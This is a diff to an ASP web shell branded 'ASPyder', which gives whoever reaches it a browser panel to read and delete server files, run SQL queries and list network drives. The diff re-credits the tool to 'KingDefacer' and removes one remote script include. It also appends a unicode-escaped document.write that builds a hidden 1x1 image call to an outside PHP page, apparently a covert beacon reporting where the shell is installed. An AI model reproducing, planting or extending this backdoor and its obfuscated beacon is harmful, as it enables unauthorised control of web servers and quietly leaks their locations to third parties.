@@ -534,7 +534,7 @@ End Sub
         <input name=cmdSubmit type=button value=Submit><input name=cmdTables type=button value=Tables><input name=cmdColumns type=button value=Columns><input name="reset" type=reset value=Reset><input name=cmdClear type=button value=Clear><input name=cmdBack type=button value="Return"><input type="Checkbox" name="chkXML" <%IF Request.Form("chkXML")= "on" tHEN Response.Write " checked " %>><font color="#CCCCCC" size="1" face="Verdana, Arial, Helvetica, sans-serif">GenerateXML</FONT>
     </td>
 	<td>XXXXXX</td><td>
-	<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by ~sir_shagalot</TT></font></center>
+	<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by KingDefacer</TT></font></center>
 	</td></tr></table>
 <table><tr><td><%If Request.Form("chkXML") = "on"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>
 <HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=-1 color=gray>Cheers to <a href="mailto:hAshish@shagzzz.cjb.net">hAshish</a> for all the help!</font></p><BR>
@@ -552,7 +552,7 @@ end if
 <title><%=MyPath%></title>
 </head>
 <body bgcolor=black text=white topAprgin="0">
-<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->
+<!-- Copyright Vela iNC. Apr2003 [alturks.com] Edited By KingDefacer-->
 <%
 		Response.Flush
 'Code Optimisation START
@@ -631,6 +631,7 @@ file Attributes: <%=f.attributes%><BR>
 	Set f = Nothing
 	response.write "<center><FORM action=""" & Request.Servervariables("SCRIPT_NAME") & "?txtpath=" & MyPath & """ METHOD=""POST"">"
 		'read the file
+		
 		Set f = fso.OpenTextFile(pathname)
 		If NOT f.AtEndOfStream Then fstr = f.readall
 		f.Close
@@ -713,7 +714,7 @@ select case err.number
 end select
 '---Report errors end
 %>
-<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by ~sir_shagalot</TT></font></center>
+<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by KingDefacer</TT></font></center>
 <font face=Courier>
 <table><tr><td>
 <form method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" name="myform" >
@@ -725,7 +726,7 @@ end select
 </td><td><center>
 <table bgcolor=#505050 cellpadding=4><tr><td bgcolor=black ><a href="<%=Request.Servervariables("SCRIPT_NAME")%>?getDRVs=@&txtpath=<%=MyPath%>"><font size=-2 face=arial>Retrieve Available Network Drives</a></td></tr>
 <tr><td bgcolor=black align=right><A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?qa=@&txtpath=<%=MyPath%>"><font size=-2 face=arial>SQL Query Analyser</A></td></tr>
-<tr><td bgcolor=black  align=right><A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?logoff=@&...thankyou.for.using.ASpyder....~sir_shagalot!..[shagzzz.cjb.net]"><font size=-2 face=arial>+++LOGOFF+++</A></td></tr></table>
+<tr><td bgcolor=black  align=right><A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?logoff=@&...thankyou.for.using.ASpyder....KingDefacer!..[shagzzz.cjb.net]"><font size=-2 face=arial>+++LOGOFF+++</A></td></tr></table>
 </td></tr></table>
 <p align=center ><Table width=75% bgcolor=#505050 cellpadding=4 ><tr><td>
 <form method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" ><font face=arial size=-1 >Delete file from current directory:</font><BR>
@@ -825,4 +826,4 @@ Next
 
 </font><HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=1 face=arial>[ System: <%=now%> ]</font></p><BR>
 </body></html>
-<SCRIPT SRC=http://www.saldiri.org/summer/ciz.js></SCRIPT>
+<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>
